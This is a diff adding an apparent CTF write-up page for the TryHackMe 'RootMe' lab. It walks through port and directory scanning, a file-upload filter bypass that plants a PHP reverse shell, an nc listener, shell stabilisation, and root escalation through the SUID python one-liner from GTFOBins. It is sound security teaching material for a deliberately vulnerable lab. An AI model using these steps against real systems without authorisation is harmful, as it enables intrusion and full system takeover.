@@ -1,0 +1,203 @@
+<title>TryHackMe - RootMe (Easy)</title>
+<header>
+  <div class="header">
+    <div class="titleContainer">
+      <img class="headerIcon" src="/write-ups/TryHackMe/Easy/RootMe/icon.png"/>
+      <p class="mainTitle">TryHackMe - RootMe (Easy)</p>
+    </div>
+  </div>
+</header>
+<div class="writeUp">
+    <h1 id="table-of-contents">Table of contents</h1>
+    <nav id="tableOfContents" class="tableOfContents">
+    </nav>
+    <h1 id="reconnaissance">Reconnaissance</h1>
+    <h2 id="nmap-scan">Nmap scan</h2>
+    <p>Like always, let's use <a href="https://nmap.org/">nmap</a> to find open ports on the target :</p>
+    <div class="codeBlock">┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/RootMe]
+└─$ nmap 10.10.237.46 -A -p- -oN nmapResults.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 12:21 CEST
+Nmap scan report for 10.10.237.46
+Host is up (0.032s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: HackIT - Home
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.54 seconds</div>
+    <p>Question : Scan the machine, how many ports are open ?</p>
+    <p>Answer : <b>2</b></p>
+
+    <p>Question : What version of Apache is running ?</p>
+    <p>Answer : <b>2.4.29</b></p>
+
+    <p>Question : What service is running on port 22 ?</p>
+    <p>Answer : <b>SSH</b></p>
+
+    <h2 id="web-reconnaissance">Web reconnaissance</h2>
+    <p>Let's use <a href="https://github.com/OJ/gobuster">Gobuster</a> to find hidden directories on the website :</p>
+    <div class="codeBlock">┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/RootMe]
+└─$ gobuster dir -u http://10.10.237.46/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.237.46/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/01 12:22:13 Starting gobuster in directory enumeration mode
+===============================================================
+/uploads              (Status: 301) [Size: 314] [--> http://10.10.237.46/uploads/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.237.46/css/]    
+/js                   (Status: 301) [Size: 309] [--> http://10.10.237.46/js/]     
+/panel                (Status: 301) [Size: 312] [--> http://10.10.237.46/panel/]  
+Progress: 6822 / 220561 (3.09%)</div>
+
+    <p>
+        There is a directory named <code>/uploads</code>, so there must be a way to upload files to the server. So maybe we can upload 
+        a reverse shell ? If we go to the <code>/panel</code> directory, there is a form to upload files to the server :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/RootMe/image1.png"/>
+    <p>Question : What is the hidden directory ?</p>
+    <p>Answer : <b>/panel/</b></p>
+
+    <h1 id="initial-access">Initial access</h1>
+    <h2 id="bypassing-upload-filter">Bypassing upload filter</h2>
+    <p>
+        If we try to upload the <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a> 
+        file by Pentestmonkey using the upload form, we get an error :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/RootMe/image2.png"/>
+    <p>
+        (I have already changed the IP address and the port in the php file. Don't forget to change it to your IP address and to 
+        change the listening port to the one you'll use)
+    </p>
+    <p>
+        It says that <code>php</code> files are not accepted. There must be a way to bypass the filter. So I just changed the extension of 
+        the file to <code>.phtml</code> and it worked :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/RootMe/image3.png"/>
+
+    <h2 id="getting-a-shell">Getting a shell</h2>
+    <p>If we take a look at the <code>/uploads</code> directory we found earlier, we can see our uploaded reverse shell :</p>
+    <img src="/write-ups/TryHackMe/Easy/RootMe/image4.png"/>
+    <p>We just need to start a listener on our machine :</p>
+    <div class="codeBlock">┌──(attacker@AttackBox)-[~]
+└─$ nc -lnvp 4242
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4242
+Ncat: Listening on 0.0.0.0:4242</div>
+    <p>
+        And then navigate to our reverse shell, in my case it is <code>http://10.10.237.46/uploads/php-reverse-shell.phtml</code>. 
+        And if we take a look at our listener, we have a shell :
+    </p>
+    <div class="codeBlock">Ncat: Connection from 10.10.237.46.
+Ncat: Connection from 10.10.237.46:36942.
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 10:39:14 up 21 min,  0 users,  load average: 0.00, 0.01, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ </div>
+
+    <h1 id="post-exploitation">Post-exploitation</h1>
+    <h2 id="local-reconnaissance">Local reconnaissance</h2>
+    <p>Let's do some simple enumeration :</p>
+    <div class="codeBlock">$ whoami
+www-data
+$ ls /home
+rootme
+test</div>
+
+    <p>We are <code>www-data</code> and there is two user directories in <code>/home</code>. The user flag is located in <code>/var/www</code> :</p>
+    <div class="codeBlock">$ cd /var/www
+$ ls  
+html
+user.txt
+$ cat user.txt
+THM{**************}
+$</div>
+    <p>Question : Find a form to upload and get a reverse shell, and find the flag.</p>
+    <p>Answer : <b>THM{<mark class="red_text">&lt;REDACTED&gt;</mark>}</b></p>
+    <p>
+        Before looking for a way to escalate our privileges, let's stabilise our shell. First, let's use 
+        <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> to get a more interactive shell. Then we can use <code>export TERM=xterm</code> 
+        to be able to use <code>clear</code>. And to fully stabilise our shell, we can use <code>CTRL + Z</code> to background our shell. Then we use 
+        <code>stty -echo raw;fg</code>, and we have a fully stabilised shell !
+    </p>
+    <p>
+        Now, for the privilege escalation, we can use <a href="https://github.com/peass-ng/PEASS-ng/tree/master">LinPEAS</a> or just search manually. If we look for SUID binaries using 
+        <code>find / -perm -4000 2>/dev/null</code>, we find those binaries :
+    </p>
+    <div class="codeBlock">www-data@rootme:/var/www$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/traceroute6.iputils
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+<mark class="text_snip">&lt;SNIP&gt;</mark>
+/bin/mount
+/bin/su
+/bin/fusermount
+/bin/ping
+/bin/umount</div>
+
+    <p>
+        In the list, there is one binary that can be used for privilege escalation when it has the SUID bit set, it is <code>/usr/bin/python</code>. 
+        If we search for <code>python</code> on <a href="https://gtfobins.github.io/">GTFOBins</a>, we can see that it is possible to spawn a 
+        <code>root</code> shell when the SUID bit is set on <code>python</code> :
+    </p>
+    <img src="/write-ups/TryHackMe/Easy/RootMe/image5.png"/>
+    <h2 id="privilege-escalation">Privilege escalation</h2>
+    <p>Let's use this command and see if we get a <code>root</code> shell :</p>
+    <div class="codeBlock">www-data@rootme:/var/www$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+# whoami
+root</div>
+    <p>We are <code>root</code> ! Now let's get the root flag, it is located in <code>/root</code> :</p>
+    <div class="codeBlock"># cd /root
+# ls
+root.txt
+# cat root.txt
+THM{<mark class="red_text">&lt;REDACTED&gt;</mark>}</div>
+    <p>
+        Question : Search for files with SUID premission, which file is weird ?<br>
+        Answer : <b>/usr/bin/python</b>
+    </p>
+    <p>
+        Question : root.txt<br>
+        Answer : THM{<mark class="red_text">&lt;REDACTED&gt;</mark>}
+    </p>
+    <h1 id="vulnerabilities-summary">Vulnerabilities summary</h1>
+    <h1 id="tools-used">Tools used</h1>
+    <h1 id="sources">Sources</h1>
+</div>
